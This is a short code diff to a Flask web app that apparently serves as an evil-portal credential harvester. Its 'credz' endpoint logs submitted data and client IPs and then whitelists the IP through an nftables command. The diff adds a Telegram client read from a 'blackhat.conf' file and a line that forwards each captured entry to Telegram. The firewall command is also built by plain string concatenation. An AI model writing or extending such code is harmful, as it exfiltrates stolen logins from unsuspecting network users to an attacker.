@@ -2,8 +2,10 @@
 
 import os
 from flask import Flask, jsonify, request
+from telegram import Telegram
 
 app = Flask(__name__)
+telegram = Telegram("/mnt/blackhat.conf")
 
 @app.route('/api/username', methods=['POST'])
 def credz():
@@ -14,6 +16,8 @@ def credz():
 
     with open("/mnt/ep_logs.txt", "a") as f:
         f.write(f"{data}: {client_ip}\n")
+
+    telegram.send(f"{data}: {client_ip}")
 
     cmd = "nft add element ip nat allowed_ips { "
     cmd += client_ip
